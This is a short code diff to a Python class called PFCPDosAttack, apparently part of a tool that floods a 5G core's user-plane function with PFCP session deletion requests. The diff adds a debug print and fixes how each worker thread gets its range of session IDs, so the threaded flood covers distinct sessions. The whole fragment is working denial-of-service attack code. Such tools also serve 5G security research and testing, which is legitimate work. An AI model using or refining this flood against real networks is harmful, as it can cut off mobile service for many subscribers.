@@ -480,6 +480,7 @@ class PFCPDosAttack:
         pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
         for i in range(start_index, start_index+count): 
             try:
+                print(f"------ {i} -------")
                 response = pfcp_obj.Send_PFCP_session_deletion_req(seid=i)
 
                     
@@ -503,7 +504,7 @@ class PFCPDosAttack:
         start_time = time.time()
         for i in range(num_threads):
             count = per_thread + (1 if i < remaining else 0)
-            t = threading.Thread(target=self.pfcp_session_deletion_flood_worker, args=(count,))
+            t = threading.Thread(target=self.pfcp_session_deletion_flood_worker, args=(count, thread_offset))
             t.start()
             threads.append(t)
             thread_offset += count
